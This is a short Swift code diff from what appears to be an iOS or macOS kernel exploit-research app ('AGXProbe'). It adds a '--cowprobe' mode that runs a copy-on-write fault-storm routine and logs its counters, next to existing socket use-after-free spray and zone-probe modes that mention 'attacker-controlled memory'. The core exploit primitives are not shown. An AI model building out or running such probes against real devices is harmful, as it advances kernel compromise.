@@ -143,6 +143,7 @@ final class ReachViewModel: ObservableObject {
             || args.contains("--sockudp") || args.contains("--sockprec")
             || args.contains("--sockmix")
             || args.contains("--zoneprobe")
+            || args.contains("--cowprobe")
             || args.contains("--socklowbuf") { Task.detached { await self.runSocketUafMode() }; return }
         if args.contains("--autorun") { emit("AGXProbe v123 ready (use --webscan)") }
     }
@@ -690,6 +691,14 @@ func runFuzzMode() async {
     // peers. Any byte that arrives is stale-sender data landing in a socket rather than
     // in attacker-controlled memory. Must be called while the senders may still be
     // finishing, i.e. before waiting for st.done to reach n.
+    nonisolated func cowProbe() {
+        emitBg("[*] cowprobe start (CoW / external-object fault storm)")
+        var st = [Int32](repeating: 0, count: 6)
+        let kr = cow_probe_run(256, 64, &st)
+        emitBg("[*] cowprobe: make=\(st[0]) map1=\(st[1]) map2=\(st[2]) alloc=\(st[3]) copy=\(st[4]) thread=\(st[5]) firstKR=\(kr)")
+        emitBg("=== cowprobe done ===")
+    }
+
     nonisolated func sockUafPeerBytes(_ precPort: Int, _ peers: inout [Int32],
                                       _ peerLock: NSLock) -> Int {
         let probe = sockUafSprayConnected(48, precPort)
@@ -1219,6 +1228,7 @@ func runFuzzMode() async {
         let mixOnly = ProcessInfo.processInfo.arguments.contains("--sockmix")
         let lowBufOnly = ProcessInfo.processInfo.arguments.contains("--socklowbuf")
         if ProcessInfo.processInfo.arguments.contains("--zoneprobe") { sockUafZoneProbe(); return }
+        if ProcessInfo.processInfo.arguments.contains("--cowprobe") { cowProbe(); return }
         let solo = oolOnly || xzOnly || gcOnly || udpOnly || precOnly || mixOnly || lowBufOnly
         var hits = 0
         let t0 = Date()
